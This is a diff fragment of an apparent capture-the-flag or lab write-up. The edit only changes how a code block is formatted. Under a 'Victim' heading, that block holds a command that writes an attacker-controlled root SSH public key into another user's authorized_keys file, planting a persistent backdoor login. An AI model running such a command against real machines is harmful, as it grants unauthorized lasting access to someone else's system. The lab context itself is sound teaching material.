@@ -280,10 +280,8 @@ cat /root/.ssh/id_rsa.pub
 
 **Victim**
 
-```
-
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2vjG2ZoKfoNoEF1ASSVX+M2hwD5g0PmUajFDBoDGrjM63T38/cadEHbJXgH8YS6syNLsf+mnSVeF9yWIeMLjfaeoIWE9UPCmS5OuPC2ZiAf+zTvo7X+OjnQKmHmNsQYJ8lhg24g3Gpw5rWreteGTMfmFPRBDNEX6J3JsNCdhoTjAhyRRRouUM9oMw1Yl4YcRAcK8xPU8ZuE6lk3kqzrrPhaCOafTdHvBKS+Q0Bn/Cq7V0ltBWkaSHIWRc50dMfwFHPR5DlYpuN6cOyIeF2L1LTcyPNmeeD/Na1d1RlRLL3HKNSW02T1z3hUAZTdmgEUvwz726qloHUmd8Hxo0Kq0j root@ip-10-10-228-158" > /home/johnsmith/.ssh/authorized_keys
-```
+<pre><code><strong>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2vjG2ZoKfoNoEF1ASSVX+M2hwD5g0PmUajFDBoDGrjM63T38/cadEHbJXgH8YS6syNLsf+mnSVeF9yWIeMLjfaeoIWE9UPCmS5OuPC2ZiAf+zTvo7X+OjnQKmHmNsQYJ8lhg24g3Gpw5rWreteGTMfmFPRBDNEX6J3JsNCdhoTjAhyRRRouUM9oMw1Yl4YcRAcK8xPU8ZuE6lk3kqzrrPhaCOafTdHvBKS+Q0Bn/Cq7V0ltBWkaSHIWRc50dMfwFHPR5DlYpuN6cOyIeF2L1LTcyPNmeeD/Na1d1RlRLL3HKNSW02T1z3hUAZTdmgEUvwz726qloHUmd8Hxo0Kq0j root@ip-10-10-228-158" > /home/johnsmith/.ssh/authorized_keys
+</strong></code></pre>
 
 **Kali**
 
